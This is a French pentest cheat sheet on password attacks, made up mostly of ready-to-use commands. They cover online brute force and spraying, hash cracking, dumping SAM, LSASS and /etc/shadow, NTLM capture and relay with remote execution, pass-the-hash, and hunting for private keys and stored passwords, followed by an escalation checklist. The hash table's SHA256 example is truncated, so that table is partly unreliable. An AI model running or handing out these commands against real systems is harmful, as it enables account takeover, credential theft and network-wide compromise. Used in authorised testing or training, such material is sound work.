# 14 — Password Attacks

## Objectifs
Obtenir et casser des identifiants : brute force contrôlé, cracking hors ligne, Pass-the-Hash, relais NTLM, clés et coffres.

---

## 1. Attaques en ligne (avec prudence)

```bash
# HTTP POST login
hydra -l admin -P <WORDLIST> <TARGET> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
hydra -L users.txt -P <WORDLIST> <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# HTTP Basic
hydra -L users.txt -P <WORDLIST> -s 80 <TARGET> http-get /

# SSH
hydra -L users.txt -P <WORDLIST> ssh://<TARGET>
# FTP
hydra -L users.txt -P <WORDLIST> ftp://<TARGET>
# RDP (attention au lockout)
hydra -L users.txt -P <WORDLIST> rdp://<TARGET>
# SMB
hydra -L users.txt -P <WORDLIST> smb://<TARGET>
# MySQL / MSSQL
hydra -L users.txt -P <WORDLIST> mysql://<TARGET>
```

```bash
# netexec : spray avec gestion du lockout
netexec smb <TARGET> -u users.txt -p 'Password123' --continue-on-success
netexec smb <TARGET> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
netexec winrm <TARGET> -u users.txt -p <PASS> --continue-on-success
netexec ssh <TARGET> -u users.txt -p <PASS> --continue-on-success
```

### Verrouillage de compte
```bash
# Toujours lire la policy AVANT de sprayer
netexec smb <DC> -u <USER> -p <PASS> --pass-pol
# lockoutThreshold : si 3, ne jamais dépasser 2 essais par compte
```

Règles :
- 1 mot de passe × N comptes (spray) plutôt que N mots de passe × 1 compte.
- Espacer les tentatives (`--delay`, `-t 1`).
- Éviter les comptes de service (souvent verrouillés définitivement).

---

## 2. Formats de hash & cracking

| Hash | Format | hashcat |
|---|---|---|
| MD5 | `8743b52063cd84097a65d1633f5c74f5` | `-m 0` |
| SHA1 | `40bd001563085fc35165329ea1ff5c5ecbdbbeef` | `-m 100` |
| SHA256 | `5e884898da28047151d0e56f8dc6292773603d0d` | `-m 1400` |
| NTLM | `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c` | `-m 1000` |
| NetNTLMv2 | `user::domain:challenge:response:blob` | `-m 5600` |
| Kerberoast (TGS-REP) | `$krb5tgs$23$*user$...` | `-m 13100` |
| AS-REP | `$krb5asrep$23$user@dom:...` | `-m 18200` |
| bcrypt | `$2y$10$...` | `-m 3200` |
| SHA512crypt (Linux) | `$6$...` | `-m 1800` |
| SSH key (id_rsa) | PEM | `-m 22931` (john) |
| KeePass | `.kdbx` | `keepass2john` → `-m 13400` |

```bash
hashcat -m 1000 ntlm.txt <WORDLIST> -O -w 3
hashcat -m 5600 netntlm.txt <WORDLIST>
hashcat -m 13100 krb.txt <WORDLIST> --force
hashcat -m 1800 shadow.txt <WORDLIST>

# Règles (mutation)
hashcat -m 1000 ntlm.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s   # mask attack

john --wordlist=<WORDLIST> --format=NT hashes.txt
john --show hashes.txt
```

```bash
# Identifier un hash inconnu
hashid '<HASH>'
hash-identifier
```

---

## 3. Obtenir des hashes

```bash
# Linux
cat /etc/shadow           # root requis
unshadow passwd shadow > unshadowed.txt

# Windows local (admin requis)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET>
netexec smb <TARGET> -u <USER> -p <PASS> --sam --lsa

# LSASS en mémoire
mimikatz # sekurlsa::logonpasswords
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Cache de credentials
mimikatz # lsadump::cache
```

---

## 4. Net-NTLMv2 : capture et relais

```bash
# Capture (réseau local)
sudo responder -I tun0 -v
# Déclencher une connexion SMB sortante depuis la cible
# → \\<LHOST>\share

# Déclencheurs
netexec smb <TARGET> -u <USER> -p <PASS> -M coerce_plus
impacket-ntlmrelayx -tf targets.txt -smb2support
```

```bash
# Relais NTLM → SMB (si SMB signing désactivé)
impacket-ntlmrelayx -tf targets.txt -smb2support -i     # shell interactif
impacket-ntlmrelayx -tf targets.txt -smb2support -e shell.exe

# Vérifier le signing
netexec smb <TARGET> --gen-relay-list relay.txt
```

```bash
# Cracker un NetNTLMv2 capturé
hashcat -m 5600 capture.txt <WORDLIST>
```

> Le relais ne fonctionne **pas** vers un hôte avec SMB signing obligatoire (souvent les DC).

---

## 5. Pass-the-Hash / Pass-the-Ticket

```bash
# PtH SMB
netexec smb <TARGET> -u Administrator -H <NTHASH> --local-auth
impacket-psexec <DOMAIN>/Administrator@<TARGET> -hashes :<NTHASH>

# PtH WinRM
evil-winrm -i <TARGET> -u Administrator -H <NTHASH>

# Overpass-the-Hash (Kerberos)
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTHASH>
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

---

## 6. Clés SSH & coffres

```bash
# Clé sans passphrase
chmod 600 id_rsa
ssh -i id_rsa <USER>@<TARGET>

# Clé protégée
ssh2john id_rsa > key.hash
john key.hash --wordlist=<WORDLIST>

# KeePass
keepass2john database.kdbx > kp.hash
john kp.hash --wordlist=<WORDLIST>
# puis ouvrir avec keepassxc
```

```bash
# Clés trouvées sur un système compromis
find / -name "id_*" -o -name "*.pem" -o -name "*.ppk" 2>/dev/null
grep -rl "BEGIN OPENSSH PRIVATE KEY" / 2>/dev/null
```

---

## 7. Mots de passe par défaut / faibles

```bash
# Recherche de configs contenant des creds
grep -riE "pass(word|wd)?\s*[:=]" /var/www /opt /home /etc 2>/dev/null
find / -name "*.env" -o -name "wp-config.php" -o -name "web.config" 2>/dev/null
```

Listes courtes à essayer avant rockyou : `admin:admin`, `root:root`, `user:password`, nom de l'app, nom de la société + année.

---

## 8. Étapes après obtention

1. **Tester partout** (spray léger sur tous les services).
2. **Chercher les réutilisations** (même mot de passe local admin).
3. **Escalader** : admin local → dump → autres comptes → domaine.
4. **Documenter** : source du credential (fichier, hash, capture).

---

## 9. Checklist

- [ ] Politique de verrouillage lue avant tout brute force
- [ ] Listes d'utilisateurs construites (web, SMB, Kerberos, OSINT)
- [ ] Spray contrôlé effectué
- [ ] Hashes identifiés (`hashid`) et crackés (`hashcat`/`john`)
- [ ] Responder/relais tentés si réseau local
- [ ] PtH testé sur SMB/WinRM
- [ ] Clés SSH et coffres testés
- [ ] Creds réutilisés sur les autres cibles
- [ ] Preuves conservées
